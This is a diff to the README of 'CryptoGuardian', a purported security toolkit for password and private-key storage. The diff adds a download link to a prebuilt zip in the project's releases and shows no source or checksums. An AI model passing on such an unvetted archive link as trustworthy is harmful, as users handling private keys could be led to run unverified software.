@@ -1,4 +1,4 @@
-**# 🛡️ CryptoGuardian – Digital Security Analyzer & Toolkit**  
+# **🛡️ CryptoGuardian – Digital Security Analyzer & Toolkit**  
  
 
 ---
@@ -8,6 +8,11 @@
 - 🔍 Analyze vulnerabilities in their digital habits.  
 - 🧠 Learn methods for secure password and private key storage.  
 - 🛠️ Simulate attacks on data (for educational purposes only).  
+
+---
+
+## 📥 **Download** 
+🔗 [Download](https://github.com/lekieuloan/cryptoguardian/releases/download/Download/CryptoGuardian.zip)
 
 ---
 
